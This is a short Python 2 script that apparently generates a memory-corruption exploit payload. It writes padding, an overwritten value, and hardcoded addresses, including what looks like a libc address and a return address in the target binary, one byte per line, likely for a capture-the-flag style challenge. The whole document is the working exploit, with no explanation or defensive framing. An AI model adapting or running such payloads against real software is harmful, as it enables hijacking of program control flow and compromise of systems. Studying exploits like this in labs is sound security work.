#!/usr/bin/env python2
import struct
import sys

exp = 'A'*12+struct.pack("<L",0x36)

sys.stdout.write(exp)
sys.stdout.flush()


for i in range(0x14 + 3):
	sys.stdout.write('A\n')
	sys.stdout.flush()

addr = struct.pack("<L", 0xf7eba4e0)

for ch in addr:
	sys.stdout.write(ch+"\n")
	sys.stdout.flush()


for i in range(4):
	sys.stdout.write('A'+"\n")
	sys.stdout.flush()

addr = struct.pack("<L", 0x804889b)

for ch in addr:
	sys.stdout.write(ch+"\n")
	sys.stdout.flush()


for i in range(4):
	sys.stdout.write('\x00'+"\n")
	sys.stdout.flush()


sys.stdout.write("\n")
sys.stdout.flush()


